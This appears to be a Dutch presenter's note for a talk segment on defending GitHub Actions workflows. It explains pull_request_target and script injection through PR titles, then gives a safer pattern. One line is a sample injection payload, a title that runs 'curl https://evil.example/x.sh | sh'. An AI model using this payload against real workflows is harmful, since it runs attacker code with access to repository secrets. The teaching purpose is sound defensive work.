Deel 6 — Verdediging als maintainer en in CI/CD · 0:36–0:40

De meeste CI-aanvallen uit deel 4 begonnen met één patroon: een workflow die invoer van een buitenstaander als code behandelt, met krachtige rechten. FOUT: pull_request_target draait in de context van de basisrepository, met secrets en schrijfrechten, ook voor een pull request uit een fork. En ${{ github.event.pull_request.title }} wordt door GitHub letterlijk in het shellscript geplakt, nog voor bash het ziet. Een PR met als titel “"; curl https://evil.example/x.sh | sh; echo "” sluit de echo af, voert het script van de aanvaller uit, en opent een nieuwe echo. Met toegang tot je secrets. Zo begon s1ngularity. BETER: een gewone pull_request-trigger (zonder secrets voor forks), minimale rechten, en de onvertrouwde titel via een omgevingsvariabele. Dan is $TITLE gewoon tekst voor bash, geen code. De types-regel zorgt dat de check ook opnieuw draait als iemand de titel wijzigt (edited zit niet in de standaardtypes). Vraag aan de zaal: “Wie heeft ooit ${{ }} in een run-stap gezet?” Laat ze vandaag nog zizmor over hun workflows draaien.
